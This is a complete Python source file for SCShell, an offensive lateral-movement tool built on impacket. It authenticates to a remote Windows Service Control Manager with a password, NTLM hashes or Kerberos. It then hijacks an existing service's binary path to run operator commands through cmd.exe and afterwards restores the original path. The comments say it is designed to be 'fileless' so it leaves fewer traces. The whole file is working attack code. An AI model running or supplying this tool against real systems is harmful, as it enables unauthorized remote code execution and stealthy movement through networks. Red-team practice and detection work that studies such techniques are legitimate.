#!/usr/bin/env python
# based out of # SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. code for smbexec.py authored by beto (@agsolino)
#
# This approach is using ChangeServiceConfigA to modify the binary path name and execute command. I purposely avoided
# returning commands output to make this technique fileless.
# Once the service ran the binary path name is reverted to the original one.
#
# Author:
#  Mr.Un1k0d3r (@MrUn1k0d3r)
#
# Reference for:
#  DCE/RPC
#

from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import time
import argparse
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging
from threading import Thread

from impacket import version
from impacket.examples import logger
from impacket.dcerpc.v5 import transport, scmr, epm
from impacket.dcerpc.v5.ndr import NULL
from impacket import ntlm
try:
    raw_input
except:
    raw_input = input

def capture_input(prompt):
    return raw_input(prompt)

class SCSHELL:

    def __init__(
        self,
        username='',
        password='',
        domain='',
        hashes=None,
        aesKey=None,
        doKerberos=None,
        kdcHost=None,
        ):

        self.__username = username
        self.__password = password
        self.__port = 139
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__scmr = None
        if hashes is not None:
            (self.__lmhash, self.__nthash) = hashes.split(':')

    def run(
        self,
        remoteName,
        remoteHost,
        serviceName,
        noCmd,
        ):
        exitCli = False
        stringBinding = epm.hept_map(remoteName, scmr.MSRPC_UUID_SCMR, protocol='ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        logging.debug('binding to %s' % stringBinding)
        rpctransport.set_credentials(
            self.__username,
            self.__password,
            self.__domain,
            self.__lmhash,
            self.__nthash,
            self.__aesKey,
            )
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = rpctransport.get_dce_rpc()
        self.__scmr.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        scHandle = resp['lpScHandle']

        logging.debug('Opening service %s' % serviceName)

        resp = scmr.hROpenServiceW(self.__scmr, scHandle, serviceName)
        serviceHandle = resp['lpServiceHandle']

        resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
        binaryPath = resp['lpServiceConfig']['lpBinaryPathName']
        logging.debug('(%s) Current service binary path %s' % (serviceName, binaryPath))

        logging.info('Command need to use FULL path. No command output.')
        while not exitCli:
            userCommand = capture_input('SCShell>')
            if not userCommand == 'exit':
                if not noCmd:
                    userCommand = 'C:\windows\system32\cmd.exe /c %s' % userCommand
                logging.debug('(%s) Updating service binary path to %s' % (serviceName, userCommand))
                resp = scmr.hRChangeServiceConfigW(
                    self.__scmr,
                    serviceHandle,
                    scmr.SERVICE_NO_CHANGE,
                    scmr.SERVICE_DEMAND_START,
                    scmr.SERVICE_ERROR_IGNORE,
                    userCommand,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    )

                logging.debug('Starting service %s' % serviceName)
                try:
                    scmr.hRStartServiceW(self.__scmr, serviceHandle)
                except Exception as e:
                    error = str(e)

                    # ignoring error 1053 ERROR_SERVICE_REQUEST_TIMEOUT since it will happen if the target binary is not a service

                    if error.find('ERROR_SERVICE_REQUEST_TIMEOUT') == -1:
                        logging.critical(error)

                time.sleep(5)
                logging.debug('(%s) Reverting binary path to %s' % (serviceName, binaryPath))
                resp = scmr.hRChangeServiceConfigW(
                    self.__scmr,
                    serviceHandle,
                    scmr.SERVICE_NO_CHANGE,
                    scmr.SERVICE_DEMAND_START,
                    scmr.SERVICE_ERROR_IGNORE,
                    binaryPath,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    )
                logging.info('Command Executed')
            else:
                exitCli = True

        scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
        scmr.hRCloseServiceHandle(self.__scmr, scHandle)

        self.__scmr.disconnect()


# Process command-line arguments.

if __name__ == '__main__':

    # Init the example's logger theme

    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-service-name', action='store', default='XblAuthManager', help='Targeted service (default to: XblAuthManager)')
    parser.add_argument('-no-cmd', action='store', default=False, help='By default it prepend C:\windows\system32\cmd.exe /c in front of your command')
    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar='ip address', help='IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action='store_true', help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')

    group.add_argument('-aesKey', action='store', metavar='hex key', help='AES key to use for Kerberos Authentication (128 or 256 bits)')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    (domain, username, password, remoteName) = \
        re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)'
                   ).match(options.target).groups('')

    # In case the password contains '@'

    if '@' in remoteName:
        password = password + '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None \
        and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass('Password:')

    if options.target_ip is None:
        options.target_ip = remoteName

    if options.aesKey is not None:
        options.k = True

    try:
        executer = SCSHELL(
            username,
            password,
            domain,
            options.hashes,
            options.aesKey,
            options.k,
            options.dc_ip,
            )
        executer.run(remoteName, options.target_ip,
                     options.service_name, options.no_cmd)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.critical(str(e))
    sys.exit(0)
